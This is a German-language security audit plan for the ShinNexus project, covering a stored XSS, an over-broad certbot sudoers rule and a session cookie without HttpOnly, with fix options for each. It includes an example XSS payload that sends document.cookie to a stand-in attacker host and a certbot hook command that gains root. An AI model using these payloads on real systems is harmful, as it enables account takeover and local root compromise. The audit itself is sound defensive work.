# ShinNexus Audit-Plan — 2026-04-30 (Welle 2 nach TLS-Implementation)

> Audit gegen `claude-code-security-review` lokal (`local_audit.py`).
> TLS-Architektur ist sauber durchgekommen — Auditor lobt `_classify_connection`.
> Drei neue Findings, alle unabhängig von TLS.

---

## Befunde-Übersicht

| # | Severity | Datei:Zeile | Bereich |
|---|---|---|---|
| 1 | HIGH | `ShinNexus.py:7875` | Stored XSS in `/api/firemail/read/{id}` |
| 2 | HIGH | `ShinNexus.py:5832` | Sudoers-Regel zu weit gefasst (Local Root via certbot-Hooks) |
| 3 | MEDIUM | `ShinNexus.py:14039` | Session-Cookie ohne `HttpOnly` |

---

## Finding 1 — Stored XSS in Firemail-Read [HIGH]

**Datei:** `ShinNexus.py:7875` (`_handle_firemail_read`)

**Was passiert:**
Die Firemail-Read-Antwort baut HTML per f-string und interpoliert `fm['sender_name']`, `fm['sender_id']`, `fm['text']` und `fm['hash']` direkt in die Markup ohne `html.escape`. Das `text`-Feld wird beim Senden vom Absender frei gesetzt (1–10000 Zeichen).

**Risk:**
Authentifizierter User schickt Firemail mit `<img src=x onerror="fetch('https://attacker/?c='+document.cookie)">`. Wenn das Opfer `/api/firemail/read/<id>` öffnet, läuft das JS im Nexus-Origin. In Kombination mit Finding 3 (Session-Cookie ohne `HttpOnly`) = Account-Takeover-Primitive.

**Fix-Strategie:**
- Jedes interpolierte Feld mit `html.escape(..., quote=True)` durchreichen.
- Zusätzlich: `Content-Security-Policy: default-src 'self'; script-src 'none'` Header für diese Response.

**Aufwand:** ~10 min.

**Status:** offen.

---

## Finding 2 — Sudoers-Regel zu weit gefasst [HIGH]

**Datei:** `ShinNexus.py:5832` (ACME-Setup-Flow)

**Was passiert:**
Wenn `sudo` ein Passwort verlangt, schreibt der Code `/etc/sudoers.d/shinnexus-certbot` mit dem Inhalt:

```
<USER> ALL=(ALL) NOPASSWD: <certbot_bin> *
```

Das Wildcard `*` erlaubt beliebige `certbot`-Argumente — inklusive `--pre-hook`, `--post-hook`, `--deploy-hook`, `--manual-auth-hook`, die alle beliebige Shell-Befehle als root ausführen.

**Risk:**
Jeder lokale Prozess unter dem ShinNexus-User (kompromittierter Browser, malicious Dependency, anderer lokaler User der zu diesem User wechselt) kann via `sudo certbot ... --manual-auth-hook 'id > /tmp/pwn'` root werden. Der ganze Sinn von `sudo`-Schutz ist damit weg.

**Fix-Strategie (Optionen — Hasi entscheidet):**
- **A:** `--http-01-port` auf nicht-privilegierten Port + Reverse-Proxy für Port 80 → kein root nötig
- **B:** `python-acme` direkt benutzen → root nie nötig
- **C:** Sudoers-Regel auf konkreten certbot-Aufruf einschränken via Wrapper-Skript mit fester Argumentliste (kein Hook-Flag, kein Wildcard)
- **D:** Regel komplett rausnehmen — User soll Caddy oder externes ACME-Setup selbst machen (passt zur "Caddy bleibt extern"-Linie aus TLS-Architektur)

**Aufwand:**
- A oder C: ~30-40 min
- D: ~10 min, plus Doku-Update

**Status:** offen — Hasi-Entscheidung steht aus.

---

## Finding 3 — Session-Cookie ohne `HttpOnly` [MEDIUM]

**Datei:** `ShinNexus.py:14039` (sowie 14063, 15824, 16503)

**Was passiert:**
Der Session-Token wird client-seitig per `document.cookie = 'nexus_session=...; path=/; SameSite=Strict; Secure'` gesetzt. Da JS den Cookie schreibt, kann `HttpOnly` nicht gesetzt werden (CSP/Cookie-Spec). Der Cookie ist immer JS-lesbar.

**Risk:**
Jede XSS in der App (Finding 1, oder zukünftige) kann den Auth-Token aus `document.cookie` lesen und für privilegierte Operationen als das Opfer nutzen. Ohne `HttpOnly` = Voll-Takeover statt Page-Scope.

**Fix-Strategie:**
- Session-Cookie server-seitig per `Set-Cookie`-Header ausliefern mit `HttpOnly`, `Secure`, `SameSite=Strict`, `Max-Age`.
- Client liest nicht mehr aus JS, sondern lässt den Browser den Cookie automatisch mitsenden.
- Server akzeptiert Cookie zusätzlich zum bestehenden `X-Session-Token`-Header (Backwards-Kompatibilität).

**Aufwand:** ~30 min (Server-Code + Frontend-Anpassung).

**Status:** offen.

---

## Reihenfolge der Fixes (Vorschlag)

1. **Finding 1 (Firemail-XSS)** zuerst — kürzester Aufwand, größter Impact (HIGH).
2. **Finding 3 (HttpOnly)** als zweites — ergänzt Finding 1 (Defense-in-Depth gegen zukünftige XSS).
3. **Finding 2 (Sudoers)** zuletzt — Hasi-Entscheidung über Strategie nötig, ggf. größerer Eingriff.

---

## Hasi-Entscheidungen die anstehen

- **Finding 2:** Welche der vier Strategien (A/B/C/D)? Vorschlag Ray: **D** — passt zur Linie "Caddy bleibt extern", reduziert Maintenance-Last.
- **Finding 1:** OK so durchziehen mit `html.escape` + CSP-Header?
- **Finding 3:** Server-Set-Cookie-Migration OK?

---

## Konsistenz mit TLS-Architektur

Diese drei Findings betreffen XSS, Sudoers, Cookie-Hardening — komplett unabhängig von TLS. Die TLS-Schicht ist nach diesem Audit clean: 0 verify-mode-Findings, `_classify_connection` wird vom Auditor explizit gelobt.

---

*Erstellt: 2026-04-30 von Ray nach lokalem Audit-Lauf via `claude-code-security-review`.*
